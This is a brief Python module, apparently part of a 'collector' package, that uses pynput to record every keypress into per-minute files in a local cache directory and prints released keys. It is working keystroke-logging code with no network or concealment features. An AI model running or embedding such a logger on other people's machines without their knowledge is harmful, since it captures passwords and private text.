# _*_ coding:utf-8 _*_

import os

from pynput import keyboard
from collector.utils import common

__TASK__ = 'KEYBOARD'
cache_dir = common.get_cache_dir(sub_name=__TASK__)


def on_press(key):
    try:
        _, dt_str = common.get_time_info(fmt="%Y-%m-%d-%H-%M")
        save_path = os.path.join(cache_dir, dt_str)
        with open(save_path, 'a') as fd:
            fd.write(str(key) + '\n')
    except AttributeError:
        pass


def on_release(key):
    print('released key: {0}'.format(key))


def run():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    keyboard_listener.join()


if __name__ == '__main__':
    k = keyboard.Listener(on_press=on_press)
    k.start()
    k.join()
